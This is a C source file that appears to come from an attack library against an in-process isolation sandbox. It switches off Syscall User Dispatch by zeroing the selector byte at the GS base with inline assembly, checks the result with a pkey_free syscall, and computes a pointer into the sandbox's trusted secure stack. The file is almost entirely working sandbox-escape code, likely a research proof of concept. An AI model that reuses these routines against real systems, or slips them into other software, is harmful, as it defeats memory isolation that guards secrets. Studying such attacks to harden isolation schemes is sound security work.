#include <sys/syscall.h>
#include <asm/prctl.h>
#include <unistd.h>
#include <stdio.h>
#include "_libattack.h"
#define _GNU_SOURCE             /* See feature_test_macros(7) */
#include <sys/mman.h>
#include "assert.h"
#include "errno.h"

size_t* secret;

void disable_sud(){
    char* gs_base;
    asm("rdgsbase %[ret]\n"
        :[ret]"=r"(gs_base)
        :"c"(0)
        :"rax", "rdx");
    char* sud = (char*)(gs_base+0);
    *sud = 0;
}

int sud_test(){
    if(syscall(__NR_pkey_free, 1)==0){
        printf("sud disabled\n");
    }else{
        printf("pkey free failed %d\n", errno);
    }
    return 0;
}

char* get_trusted_mem(){
    char* gs_base;
    if (syscall(SYS_arch_prctl, ARCH_GET_GS, &gs_base) != 0) {
        return NULL;
    }
    return (char*)(gs_base+SECURE_STACK_SP_OFFSET);
}